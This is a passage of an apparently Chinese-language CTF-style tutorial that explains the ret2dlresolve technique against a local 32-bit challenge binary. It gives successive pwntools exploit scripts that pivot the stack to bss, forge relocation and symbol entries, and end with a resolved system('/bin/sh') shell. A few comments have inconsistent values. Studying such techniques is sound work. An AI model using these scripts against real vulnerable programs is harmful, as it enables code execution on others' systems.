<span class="comment">#覆盖调用函数的返回地址</span></span><br><span class="line">, p32(<span class="number">1</span>)    <span class="comment">#掉用函数的三个参数</span></span><br><span class="line">, p32(bss_stage + <span class="number">80</span>)</span><br><span class="line">, p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">, <span class="string">&#x27;A&#x27;</span> * <span class="number">52</span></span><br><span class="line">, cmd + <span class="string">&#x27;\x00&#x27;</span> <span class="comment">#bss_stage + 80</span></span><br><span class="line">, <span class="string">&#x27;A&#x27;</span> * <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>下一步，我们通过控制 <code>reloc_arg</code> 的数值，使动态链接器在解析重定位时访问到位于 <strong>可控内存（bss 段）</strong> 的伪造重定位表项。随后在 bss 段中手动构造一个假的 <code>Elf32_Rel</code> 结构（即伪造 <code>.rel.plt</code> 中某个函数如 <code>write</code> 的重定位项），从而可以控制其中的 <code>r_info</code> 字段，使动态解析流程按照我们伪造的符号信息进行解析并执行，达到任意函数调用的目的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	Elf32_Addr r_offset; <span class="comment">// 对于可执行文件，此值为虚拟地址</span></span><br><span class="line">	Elf32_Word r_info; <span class="comment">// 符号表索引</span></span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 原本是</span><br><span class="line">reloc_arg + rel_plt = rel_plt-&gt;write</span><br><span class="line">// 伪造成</span><br><span class="line">fake_arg + rel_plt = fake_write</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./reslove&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08049301</span> <span class="comment"># ROPgadget --binary bof --only &quot;pop|ret&quot;</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08049303</span></span><br><span class="line">leave_ret = <span class="number">0x08049145</span> <span class="comment"># ROPgadget --binary bof --only &quot;leave|ret&quot;</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804c024</span> <span class="comment"># readelf -S bof | grep &quot;.bss&quot;</span></span><br><span class="line">bss_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./reslove&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;ret2dlresolve\n&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;A&#x27;</span> * offset    <span class="comment">#栈迁移</span></span><br><span class="line">, p32(read_plt)</span><br><span class="line">, p32(ppp_ret)</span><br><span class="line">, p32(<span class="number">0</span>)</span><br><span class="line">, p32(bss_stage)</span><br><span class="line">, p32(<span class="number">100</span>)</span><br><span class="line">, p32(pop_ebp_ret)</span><br><span class="line">, p32(bss_stage)</span><br><span class="line">, p32(leave_ret))</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x8049030</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x8048348</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">fake_write_addr = bss_stage + <span class="number">28</span></span><br><span class="line">fake_arg = fake_write_addr - rel_plt</span><br><span class="line">r_offset = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">r_info = <span class="number">0x507</span> <span class="comment"># 对应wirte，由 readelf -r bof 查询</span></span><br><span class="line">fake_write = flat(p32(r_offset), p32(r_info)) <span class="comment"># 伪造的rel_write</span></span><br><span class="line"></span><br><span class="line">payload2 = flat(<span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">, p32(plt_0)</span><br><span class="line">, fake_arg</span><br><span class="line">, <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">, p32(<span class="number">1</span>)</span><br><span class="line">, p32(bss_stage + <span class="number">80</span>)</span><br><span class="line">, p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">, fake_write  <span class="comment">#bss_stage + 28</span></span><br><span class="line">, <span class="string">&#x27;A&#x27;</span> * <span class="number">44</span></span><br><span class="line">, cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">, <span class="string">&#x27;A&#x27;</span> * <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>上一步中我们已近伪造好reloc，这一步我们只要把reloc中的r_info控制，使sym落在可控地址内，从而伪造sym，从而可以控制它的</p>
+<p><strong>st_name</strong>（偏移）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JMUP_SLOT=7</span></span><br><span class="line">assert(ELF(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure>
+
+<p><strong>.dynsym</strong>节包含了动态链接符号表。ELF32_Sym[num]中的num对应着**ELF_R_SYM(Elf32_Rel-&gt;r_info)**。根据定义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt; r_info) &gt;&gt; 8</span><br></pre></td></tr></table></figure>
+
+<p>sym的结构体如下（大小为0x10）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	Elf32_Word st_name; <span class="comment">// Symbol name(string tbl index)</span></span><br><span class="line">	Elf32_Addr st_value; <span class="comment">// Symbol value</span></span><br><span class="line">	Elf32_word st_size; <span class="comment">// Symbol size</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">// Symbol type and binding</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> st_other; <span class="comment">// symbol visibility under glibc&gt;=2.2</span></span><br><span class="line">	Elf32_Section st_shndx; <span class="comment">// Section index</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure>
+
+<p>write的索引值为ELF32_R_SYM(0x507) &#x3D; 0x607 &gt;&gt; 8 &#x3D; 5。而Elf32_Sym[6]即保存着write的符号表信息。并且ELF32_R_TYPE(0x607) &#x3D; </p>
+<p>7， 对应着R_386_JUMP_SLOT。</p>
+<p>ida中的symtab可以看到第五个索引是write，从0开始算。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048248 ; ELF Symbol Table</span><br><span class="line">LOAD:08048248                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:08048258                 Elf32_Sym &lt;offset aRead - offset unk_80482B8, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:08048268                 Elf32_Sym &lt;offset aGmonStart - offset unk_80482B8, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:08048278                 Elf32_Sym &lt;offset aStrlen - offset unk_80482B8, 0, 0, 12h, 0, 0&gt; ; &quot;strlen&quot;</span><br><span class="line">LOAD:08048288                 Elf32_Sym &lt;offset aLibcStartMain - offset unk_80482B8, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:08048288                            0&gt;</span><br><span class="line">LOAD:08048298                 Elf32_Sym &lt;offset aWrite - offset unk_80482B8, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;</span><br><span class="line">LOAD:080482A8                 Elf32_Sym &lt;offset aIoStdinUsed - offset unk_80482B8, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:080482A8                            offset _IO_stdin_used, 4, 11h, 0, 11h&gt;</span><br><span class="line">LOAD:080482B8 ; ELF String Table</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080482B8 ; ELF String Table</span><br><span class="line">LOAD:080482B8 unk_80482B8     db    0                 ; DATA XREF: LOAD:08048258↑o</span><br><span class="line">LOAD:080482B8                                         ; LOAD:08048268↑o ...</span><br><span class="line">LOAD:080482B9 aLibcSo6        db &#x27;libc.so.6&#x27;,0        ; DATA XREF: LOAD:08048320↓o</span><br><span class="line">LOAD:080482C3 aIoStdinUsed    db &#x27;_IO_stdin_used&#x27;,0   ; DATA XREF: LOAD:080482A8↑o</span><br><span class="line">LOAD:080482D2 aStrlen         db &#x27;strlen&#x27;,0           ; DATA XREF: LOAD:08048278↑o</span><br><span class="line">LOAD:080482D9 aRead           db &#x27;read&#x27;,0             ; DATA XREF: LOAD:08048258↑o</span><br><span class="line">LOAD:080482DE aLibcStartMain  db &#x27;__libc_start_main&#x27;,0</span><br><span class="line">LOAD:080482DE                                         ; DATA XREF: LOAD:08048288↑o</span><br><span class="line">LOAD:080482F0 aWrite          db &#x27;write&#x27;,0            ; DATA XREF: LOAD:08048298↑o</span><br><span class="line">LOAD:080482F6 aGlibc20        db &#x27;GLIBC_2.0&#x27;,0        ; DATA XREF: LOAD:08048330↓o</span><br><span class="line">LOAD:08048300 aGmonStart      db &#x27;__gmon_start__&#x27;,0   ; DATA XREF: LOAD:08048268↑o</span><br><span class="line">LOAD:0804830F                 align 10h</span><br></pre></td></tr></table></figure>
+
+<p>payload中0x38的由来： st_name &#x3D; write_strtab - strtab &#x3D; 0x080482F0 - 0x80482B8 &#x3D;  0x38</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原本：</span><br><span class="line">sym[num],num = (write_sym - dynsym) / <span class="number">16</span> = <span class="number">6</span></span><br><span class="line">伪造后：</span><br><span class="line">num = (fake_write_sym - dynsym) / <span class="number">16</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./reslove&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08049301</span> <span class="comment"># ROPgadget --binary bof --only &quot;pop|ret&quot;</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08049303</span></span><br><span class="line">leave_ret = <span class="number">0x08049145</span> <span class="comment"># ROPgadget --binary bof --only &quot;leave|ret&quot;</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804c024</span> <span class="comment"># readelf -S bof | grep &quot;.bss&quot;</span></span><br><span class="line">bss_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./reslove&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;ret2dlresolve\n&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;A&#x27;</span> * offset    <span class="comment">#栈迁移</span></span><br><span class="line">, p32(read_plt)</span><br><span class="line">, p32(ppp_ret)</span><br><span class="line">, p32(<span class="number">0</span>)</span><br><span class="line">, p32(bss_stage)</span><br><span class="line">, p32(<span class="number">100</span>)</span><br><span class="line">, p32(pop_ebp_ret)</span><br><span class="line">, p32(bss_stage)</span><br><span class="line">, p32(leave_ret))</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x8049030</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">dynsym = <span class="number">0x08048248</span>  <span class="comment"># readelf -S bof</span></span><br><span class="line">rel_plt = <span class="number">0x8048348</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">fake_write_addr = bss_stage + <span class="number">28</span></span><br><span class="line">fake_arg = fake_write_addr - rel_plt</span><br><span class="line">r_offset = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">align = <span class="number">0x10</span> - ((bss_stage + <span class="number">36</span> - dynsym) % <span class="number">16</span>) </span><br><span class="line">fake_sym_addr = bss_stage + <span class="number">36</span> + align <span class="comment"># 填充地址使其与dynsym的偏移16字节对齐（即两者的差值能被16整除），因为结构体sym的大小都是16字节</span></span><br><span class="line">r_info = ((((fake_sym_addr - dynsym)//<span class="number">16</span>) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span>) <span class="comment"># 使其最低位为7，通过检测</span></span><br><span class="line">fake_write = flat(p32(r_offset), p32(r_info))</span><br><span class="line">fake_sym = flat(p32(<span class="number">0x38</span>),p32(<span class="number">0</span>),p32(<span class="number">0</span>),p32(<span class="number">0x12</span>)) <span class="comment"># 0x4c就是st_name,0x12在IDA的symbol表可查到</span></span><br><span class="line"></span><br><span class="line">payload2 = flat(<span class="string">b&#x27;AAAA&#x27;</span></span><br><span class="line">, p32(plt_0)</span><br><span class="line">, fake_arg</span><br><span class="line">, p32(ppp_ret)</span><br><span class="line">, p32(<span class="number">1</span>)</span><br><span class="line">, p32(bss_stage + <span class="number">80</span>)</span><br><span class="line">, p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">, fake_write <span class="comment"># bss_stage + 28</span></span><br><span class="line">, <span class="string">b&#x27;A&#x27;</span> * align <span class="comment"># 用于对齐的填充</span></span><br><span class="line">, fake_sym <span class="comment"># bss_stage + 36 + align</span></span><br><span class="line">)</span><br><span class="line">payload2 += flat(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">80</span>-<span class="built_in">len</span>(payload2)) , cmd + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += flat(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">100</span>-<span class="built_in">len</span>(payload2)))</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>在上一步我们已经可以控制st_name了，这一步我们就要控制st_name了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原本：</span><br><span class="line">	st_name = write_strtab - strtab(dynstr)</span><br><span class="line">伪造后：</span><br><span class="line">	fake_name = fake_write_str_addr - strtab(dynstr)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./reslove&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08049301</span> <span class="comment"># ROPgadget --binary bof --only &quot;pop|ret&quot;</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08049303</span></span><br><span class="line">leave_ret = <span class="number">0x08049145</span> <span class="comment"># ROPgadget --binary bof --only &quot;leave|ret&quot;</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804c024</span> <span class="comment"># readelf -S bof | grep &quot;.bss&quot;</span></span><br><span class="line">bss_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./reslove&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;ret2dlresolve\n&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;A&#x27;</span> * offset    <span class="comment">#栈迁移</span></span><br><span class="line">, p32(read_plt)</span><br><span class="line">, p32(ppp_ret)</span><br><span class="line">, p32(<span class="number">0</span>)</span><br><span class="line">, p32(bss_stage)</span><br><span class="line">, p32(<span class="number">100</span>)</span><br><span class="line">, p32(pop_ebp_ret)</span><br><span class="line">, p32(bss_stage)</span><br><span class="line">, p32(leave_ret))</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x8049030</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">dynstr = <span class="number">0x080482b8</span> <span class="comment">#readelf -S bof</span></span><br><span class="line">dynsym = <span class="number">0x08048248</span>  <span class="comment"># readelf -S bof</span></span><br><span class="line">rel_plt = <span class="number">0x8048348</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">fake_write_addr = bss_stage + <span class="number">28</span></span><br><span class="line">fake_arg = fake_write_addr - rel_plt</span><br><span class="line">r_offset = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">align = <span class="number">0x10</span> - ((bss_stage + <span class="number">36</span> - dynsym) % <span class="number">16</span>) </span><br><span class="line">fake_sym_addr = bss_stage + <span class="number">36</span> + align <span class="comment"># 填充地址使其与dynsym的偏移16字节对齐（即两者的差值能被16整除），因为结构体sym的大小都是16字节</span></span><br><span class="line">r_info = ((((fake_sym_addr - dynsym)//<span class="number">16</span>) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span>) <span class="comment"># 使其最低位为7，通过检测</span></span><br><span class="line">fake_write = flat(p32(r_offset), p32(r_info))</span><br><span class="line">fake_write_str_addr = bss_stage + <span class="number">36</span> + align + <span class="number">0x10</span></span><br><span class="line">fake_name = fake_write_str_addr - dynstr</span><br><span class="line">fake_sym = flat(p32(<span class="number">0x38</span>),p32(<span class="number">0</span>),p32(<span class="number">0</span>),p32(<span class="number">0x12</span>)) <span class="comment"># 0x4c就是st_name,0x12在IDA的symbol表可查到</span></span><br><span class="line">fake_write_str = <span class="string">&#x27;write\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload2 = flat(<span class="string">b&#x27;AAAA&#x27;</span></span><br><span class="line">, p32(plt_0)</span><br><span class="line">, fake_arg</span><br><span class="line">, p32(ppp_ret)</span><br><span class="line">, p32(<span class="number">1</span>)</span><br><span class="line">, p32(bss_stage + <span class="number">80</span>)</span><br><span class="line">, p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">, fake_write <span class="comment"># bss_stage + 28</span></span><br><span class="line">, <span class="string">b&#x27;A&#x27;</span> * align <span class="comment"># 用于对齐的填充</span></span><br><span class="line">, fake_sym <span class="comment"># bss_stage + 36 + align</span></span><br><span class="line">, fake_write_str <span class="comment"># 伪造出的字符串</span></span><br><span class="line">)</span><br><span class="line">payload2 += flat(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">80</span>-<span class="built_in">len</span>(payload2)) , cmd + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += flat(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">100</span>-<span class="built_in">len</span>(payload2)))</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h3><p>把字符串换成system就行了,把write的参数换成system的参数就行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./reslove&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08049301</span> <span class="comment"># ROPgadget --binary bof --only &quot;pop|ret&quot;</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08049303</span></span><br><span class="line">leave_ret = <span class="number">0x08049145</span> <span class="comment"># ROPgadget --binary bof --only &quot;leave|ret&quot;</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804c024</span> <span class="comment"># readelf -S bof | grep &quot;.bss&quot;</span></span><br><span class="line">bss_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./reslove&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;ret2dlresolve\n&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;A&#x27;</span> * offset    <span class="comment">#栈迁移</span></span><br><span class="line">, p32(read_plt)</span><br><span class="line">, p32(ppp_ret)</span><br><span class="line">, p32(<span class="number">0</span>)</span><br><span class="line">, p32(bss_stage)</span><br><span class="line">, p32(<span class="number">100</span>)</span><br><span class="line">, p32(pop_ebp_ret)</span><br><span class="line">, p32(bss_stage)</span><br><span class="line">, p32(leave_ret))</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x8049030</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">dynstr = <span class="number">0x080482b8</span> <span class="comment">#readelf -S bof</span></span><br><span class="line">dynsym = 